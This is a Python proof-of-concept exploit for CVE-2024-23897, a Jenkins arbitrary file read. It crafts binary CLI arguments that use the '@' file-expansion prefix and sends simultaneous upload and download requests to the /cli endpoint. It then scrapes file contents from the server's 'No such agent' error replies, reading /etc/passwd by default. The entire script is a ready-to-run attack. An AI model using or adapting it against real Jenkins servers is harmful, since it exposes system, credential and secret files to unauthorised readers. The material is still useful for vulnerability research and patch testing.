
import argparse
import uuid
import threading
import requests
import time
import struct
import re

PADDING = b'\x00\x00'
COMMAND = "connect-node"
PAYLOAD = "@"
ENCODING = "UTF-8"
LANG = "en_US"
END_BYTES = bytes.fromhex("0000000003")

class Operation:
    ARG = 0
    LANG = 1
    ENC = 2

def get_bytes(param, operation):
    param_bytes = PADDING
    param_bytes += struct.pack(">H", len(param)+2)
    param_bytes += bytes([operation])
    param_bytes += struct.pack(">H", len(param))
    param_bytes += param.encode(ENCODING)
    return param_bytes


def get_data(file_path):
    data = get_bytes(COMMAND, Operation.ARG)
    data += get_bytes(PAYLOAD + file_path, Operation.ARG)
    data += get_bytes(ENCODING, Operation.ENC)
    data += get_bytes(LANG, Operation.LANG)
    data += END_BYTES
    return data


def download_request(host, session_id):
    url = host + "/cli?remoting=false"
    headers = {
        "Session" : session_id,
        "Side": "download"
    }
    try:
        req = requests.post(url=url, headers=headers)
        response = str(req.content)
        if "ERROR: No such file:" in response:
            print(f'[+] file not found on the server')
        else:
            pattern = r'No such agent "(.*?)"(?= exists.\\n)'
            file_lines = re.findall(pattern, str(response))
            [print(line) for line in file_lines] 
    except Exception as e:
        print(f"[-] Error in download request {str(e)}")


def upload_request(host, session_id, file_path):
    time.sleep(0.3)
    url = host + "/cli?remoting=false"
    headers = {
        "Session" : session_id,
        "Side": "upload"
    }
    data = get_data(file_path)
    try:
        req = requests.post(url=url, headers=headers, data=data)
    except Exception as e:
        print(f"[-] Error in upload request {str(e)}")

def read_file(host, file_path):
    # Create random UUID
    session_id = str(uuid.uuid4())
    # send upload/download requests
    download_thread = threading.Thread(target=download_request, args=(host, session_id))
    upload_thread = threading.Thread(target=upload_request, args=(host, session_id, file_path))
    download_thread.start()
    upload_thread.start()
    download_thread.join()
    upload_thread.join()


if __name__ == "__main__":
    # Parse arguments
    parser = argparse.ArgumentParser(description="POC for CVE-2024-23897 (Jenkins file read)")
    parser.add_argument("-u", "--url", type=str, required=True, help="Jenkins URL")
    parser.add_argument("-f", "--file", type=str, required=False, help="File path to read")
    args = parser.parse_args()
    
    # Url check
    if not args.url.startswith("http"):
        print("Url format : http://example.com:port")
        exit(1)
    # File check
    args.file = args.file if args.file else "/etc/passwd"
    print(f'[+] fetching {args.file} from {args.url}\n')
    #  Read File
    read_file(args.url, args.file)
